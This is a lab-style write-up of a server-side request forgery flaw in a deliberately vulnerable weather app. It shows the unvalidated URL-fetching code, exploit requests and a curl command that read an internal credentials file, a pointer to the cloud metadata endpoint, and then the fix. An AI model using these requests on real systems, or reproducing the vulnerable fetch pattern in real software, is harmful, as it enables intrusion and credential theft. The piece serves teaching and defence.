SSRF Through a Client-Supplied API URL

WeatherCheck looks like a simple weather app. You pick a city and the server fetches a weather API. But the entire API URL is built in the browser and sent in the request body, so the server will fetch whatever URL the client provides — including internal services.

Quick SSRF reminder

SSRF (Server-Side Request Forgery) happens when an application fetches a URL that the attacker controls, from the server's own network position. The server becomes a proxy that can reach things the attacker cannot: internal services, metadata endpoints, administrative interfaces, databases, or localhost-only tools.

The impact depends on what lives on the internal network. In cloud environments the first target is usually the instance metadata service (169.254.169.254). In a container lab, it's internal services on the same Docker network.

Where the vulnerability comes from

Every city card renders a form that carries the full API URL as a hidden input.

<form method="post" action="/check">
  <input type="hidden" name="city"    value="Paris">
  <input type="hidden" name="api_url" value="https://wttr.in/Paris?format=j1">
  <button>Get Weather</button>
</form>

The backend takes that URL and fetches it directly, with no validation:

def check():
    api_url = request.form.get('api_url', '').strip()
    city    = request.form.get('city', 'Unknown')

    response = http_requests.get(api_url, timeout=5)
    return render_template('result.html',
                           city=city,
                           api_url=api_url,
                           body=response.text[:8000])

The server echoes the response body back to the page, which makes this a textbook in-band SSRF — you see exactly what the server fetched.

Mapping the internal network

The docker compose file defines a second service on the same backend network:

services:
  web:
    ports:
      - "5008:5008"

  files:
    command: ["python", "-m", "http.server", "7777", ...]
    expose:
      - "7777"   # only reachable inside the docker network

The files service has expose, not ports, so port 7777 is only reachable from other containers on that network — not from your laptop. That's the asymmetry SSRF exploits.

How the exploit works

Intercept the weather request (Burp, ZAP, or "Edit and resend" in Firefox devtools) and change api_url to point at the internal service.

List the internal files

POST /check
city=Paris&api_url=http://files:7777/

The response contains the directory listing of /srv/files: credentials.txt, backup-config.json, employee-list.csv, internal-notes.md.

Read the credentials

POST /check
city=Paris&api_url=http://files:7777/credentials.txt

Same trick, different path. The response page now shows the full credentials file with fake DB, SSH, AWS and Redis creds — data you could never reach over the public internet.

With curl

curl -s -X POST http://localhost:5008/check \
  --data-urlencode "city=Paris" \
  --data-urlencode "api_url=http://files:7777/credentials.txt"

In a real cloud environment the same pattern reaches metadata endpoints (http://169.254.169.254/latest/meta-data/), internal admin panels, unauthenticated Elasticsearch or Redis, and other services that trust the network perimeter.

Fix

Don't take a full URL from the client. Let the user pick a city name and build the URL on the server.

CITIES = {'Paris', 'Tokyo', 'New York', ...}

def check():
    city = request.form.get('city', '')
    if city not in CITIES:
        return 'Unknown city', 400

    url = f"https://wttr.in/{city}?format=j1"
    response = http_requests.get(url, timeout=5)
    # ...

If for some reason the app really has to accept a URL, validate after resolving DNS and before the HTTP request:

  • Allowlist of hosts, not a denylist. wttr.in only, everything else rejected.
  • Force the scheme to https.
  • Resolve the hostname and reject RFC1918 ranges, 127.0.0.0/8, 169.254.0.0/16, and IPv6 equivalents (::1, fc00::/7).
  • Disable redirects, or re-validate each hop. Otherwise a public URL can redirect to http://169.254.169.254/ and bypass the IP check.
  • Put the outbound request through a network policy that cannot reach internal services in the first place.

Allowlisting the destination is almost always the right answer. URL validation alone is very hard to get right.
